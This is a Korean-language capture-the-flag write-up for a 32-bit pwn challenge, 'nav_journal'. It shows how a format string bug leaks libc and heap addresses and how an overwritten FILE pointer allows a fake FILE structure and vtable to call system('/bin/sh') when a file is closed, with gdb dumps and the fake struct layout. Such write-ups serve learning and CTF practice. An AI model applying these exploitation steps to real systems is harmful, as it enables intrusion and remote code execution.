nav_journal write up
---------------
pwn , 473pts

desc 
---------------

- FSB
- FSOP


files 
---------------

- challenge 
- libc.so.6(glibc 2.23->ubuntu 16.04)
- ld-2.23.so

checksec 
---------------
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
solution 
---------------
프로그램 실행 시 이름을 입력받고, 메뉴가 9개 나온다. 
```
Enter your name: aa
Hello, aa
------ Navigation Journal ------
1. Open main journal
2. Read main journal
3. Close main journal
4. Create sub journal
5. Write sub journal
6. Read sub journal
7. Close sub journal
8. Change username
9. Exit
```
이름은 전역변수 영역에 최대 0x54바이트만큼 입력받고, 마지막바이트는 0으로 초기화시킨다. 
파일 open시는 /tmp/journal.txt 을 열어서 파일 포인터는 전역변수 영역 nav_jr + 1536에 저장한다.
read시에는 nav_jr+1024영역에 파일의 내용을 0x200 바이트 만큼 읽어와 출력하고, close시에는 파일 포인터를 제거한다.

4번부터는 sub journal인데, create는 무작위 경로를 만들어 파일을 생성하고, 직접 이름을 입력할지 선택할 수 있다. 
이름을 입력할때 문제열이 특정 문자들과 일치하는지를 비교, 같으면 해당 문자열을 32로 바꾼다. 일종의 필터링 작업. 
이때 New File name이 출력되는 printf 문에서 fsb가 발생한다. 

5번은 파일에 0x604바이트만큼 내용을 쓰고, 6번은 같은 크기만큼 읽어와 출력한다. 
7번은 해당 파일포인터를 닫고, 8번은 시작할때 입력했던 username을 수정한다. 

5번의 내용대로면, 파일 포인터가 저장된 영역에 원하는내용대로 값을 쓰는것이 가능해지는데
해당 위치는 힙영역의 시작위치이고, 해당 위치에 입력값을 위해 0x610크기의 청크가 할당된다.
여기서 문제가 발생하는데, 입력값의 포인터 시작주소를 기준으로 385번째 배열위치에
위에서 만든 파일의 fopen결과, 즉 파일 포인터가 들어가게 된다.  385번쨰 배열위치는 385*4 = 0x604위치인데,
sub journal이 아닌 main journal을 close 할때는 384번쨰 배열위치를 참조한다. 
즉, 파일 내용을 입력할때 마지막 4바이트가 main journal의 파일 구조체 포인터 주소를 덮어쓰게 되는것. 
그렇게 되면 main을 close 할때 에러가 발생한다. 

그렇다면 입력값을 넣을때 해당 힙 위치에 가짜 파일구조체를 만든 다음, 
마지막 4바이트는 가짜 파일구조체가 만들어져 있는 힙의 주소를 넣어주는 식으로 FSOP를 유발할 수있겠다.

순서를 정리해보면, 4번의 create에서 FSB를 이용해 주소 leak -> 5번에서 FSOP 순.
fsb시 6바이트만 입력 가능하므로 여러번의 시도가 필요하다.
system 함수의 주소을 사용하기 위한 libc base와 fake vtable 구성을 위한 heap영역의 주소를 찾아야한다. 
libc는 5번쨰에서, heap은 12번째에서 각각 나온다.

이제 가짜 구조체를 만들어줘야 하는데, 32비트에서는 파일 구조체가 어떤식으로 구성되는지를 먼저 확인해보자.


```
gdb-peda$ x/40wx 0x09a0aa20                                                              
0x9a0aa20:      0xfbad2484      0x00000000      0x00000000      0x00000000
0x9a0aa30:      0x00000000      0x00000000      0x00000000      0x00000000
0x9a0aa40:      0x00000000      0x00000000      0x00000000      0x00000000
0x9a0aa50:      0x00000000      0x09a098b8      0x00000005      0x00000000
0x9a0aa60:      0x00000000      0x00000000      0x09a0aab8      0xffffffff
0x9a0aa70:      0xffffffff      0x00000000      0x09a0aac4      0x00000000
0x9a0aa80:      0x00000000      0x00000000      0x00000000      0x00000000
0x9a0aa90:      0x00000000      0x00000000      0x00000000      0x00000000
0x9a0aaa0:      0x00000000      0x00000000      0x00000000      0x00000000
0x9a0aab0:      0x00000000      0xf7744ac0      0x00000000      0x00000000
gdb-peda$ x/10wx 0xf7744ac0
0xf7744ac0 <_IO_file_jumps>:    0x00000000      0x00000000      0xf75fc980      0xf75fd3a0
0xf7744ad0 <_IO_file_jumps+16>: 0xf75fd140      0xf75fe220      0xf75ff0b0      0xf75fc5f0
0xf7744ae0 <_IO_file_jumps+32>: 0xf75fc200      0xf75fb4a0
gdb-peda$ x/3i 0xf75fc980
   0xf75fc980 <_IO_new_file_finish>:    push   ebx
   0xf75fc981 <_IO_new_file_finish+1>:  sub    esp,0x8
   0xf75fc984 <_IO_new_file_finish+4>:  mov    ebx,DWORD PTR [esp+0x10]
```

파일 구조체 시작주소 0x94위치에 vtable의 주소가 저장되고, vtable+0x8위치가 file_finish의 주소가 들어갈 곳이다.
파일 포인터 첫 위치에 있는 값이 __file__finish 함수의 인자값이 되어 들어가므로 해당 위치에는 "/bin/sh" 문자열이 들어가야 한다 .

```
"/bin/sh"                       0x00000000      0x00000000
0x00000000      0x00000000      0x00000000      0x00000000
0x00000000      0x00000000      0x00000000      0x00000000
0x00000000      0x00000000      0x00000000      0x00000000
0x00000000      0x00000000      유효한 주소     0xffffffff
0xffffffff      0x00000000      유효한 주소     0x00000000
0x00000000      0x00000000      0x00000000      0x00000000
0x00000000      0x00000000      0x00000000      0x00000000
0x00000000      0x00000000      0x00000000      0x00000000
0x00000000      heap+0xa0       0x00000000      0x00000000
0x00000000      0x00000000      system함수 주소 0x00000000 <- vtable 

```
이렇게 파일포인터+vtable 구조를 만들어보자.
실제로 어셈을 따라가보니, 예상했던 위치의 함수를 실행하지 않고 조금 더 멀리 있는 값을 참조했다.
```
   0xf7597917 <_IO_new_file_close_it+263>:      mov    eax,DWORD PTR [ebx+eax*1+0x94]
   0xf759791e <_IO_new_file_close_it+270>:      push   ebx
=> 0xf759791f <_IO_new_file_close_it+271>:      call   DWORD PTR [eax+0x44]
```
따라서 vtable 시작주소+0x44위치에 시스템함수의 주소값을 넣어주어야 하고, 중간에 함수 내부 연산으로 인해 
파일 포인터 주소값이 들어간 위치에 +1 연산이 가해지기 때문에 주소값을 넣을떄는 1을 뺀 값을 넣어주었다.













